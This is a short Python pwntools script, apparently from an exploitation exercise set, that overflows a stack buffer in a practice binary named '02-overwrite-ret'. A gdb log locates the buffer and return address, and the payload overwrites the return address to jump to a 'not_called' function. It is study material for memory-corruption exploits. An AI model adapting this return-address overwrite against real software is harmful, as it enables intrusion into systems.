#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x804853f: file src/02-overwrite-ret.c, line 10.
(gdb) c
Continuing.
Reading /lib/i386-linux-gnu/libc.so.6 from remote target...
Reading /lib/i386-linux-gnu/libc-2.27.so from remote target...
Reading /lib/i386-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:10
10	int vulnerable() {
(gdb) i r $esp
esp            0xffc0637c	0xffc0637c
(gdb) p &buffer[0]
$1 = 0xffc062f0 ""
"""

import struct
import sys

from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './bin/x86/02-overwrite-ret'

vulnerable_ret_addr = 0xffc0637c
buffer_addr = 0xffc062f0

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p32(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
